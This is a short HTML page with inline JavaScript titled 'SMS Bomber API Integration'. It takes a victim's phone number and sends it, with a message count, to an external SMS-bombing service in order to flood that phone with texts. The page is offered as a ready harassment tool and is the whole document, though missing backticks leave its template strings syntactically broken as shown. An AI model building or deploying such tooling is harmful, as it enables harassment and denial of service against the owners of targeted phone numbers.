<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Bomber API Integration</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        #response {
            margin-top: 20px;
            border: 1px solid #ccc;
            padding: 10px;
            background-color: #f9f9f9;
        }
    </style>
</head>
<body>

<h1>SMS Bomber API Integration</h1>
<label for="phone">Phone Number:</label>
<input type="text" id="phone" placeholder="Enter phone number (e.g., +923001234567)">
<button id="sendSms">Send SMS</button>

<div id="response"></div>

<script>
    document.getElementById('sendSms').addEventListener('click', function() {
        const phone = document.getElementById('phone').value;
        const qty = 1; // Set the quantity of SMS to send

        // Construct the API URL
        const apiUrl = https://ahmadmodstools.online/PublicApis/SMSBomber.php?qty=${qty}&phone=${encodeURIComponent(phone)};

        fetch(apiUrl)
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok ' + response.statusText);
                }
                return response.json();
            })
            .then(data => {
                // Display the response data
                document.getElementById('response').innerHTML = <pre>${JSON.stringify(data, null, 2)}</pre>;
            })
            .catch(error => {
                console.error('There has been a problem with your fetch operation:', error);
                document.getElementById('response').innerHTML = 'Error: ' + error.message;
            });
    });
</script>

</body>
</html>
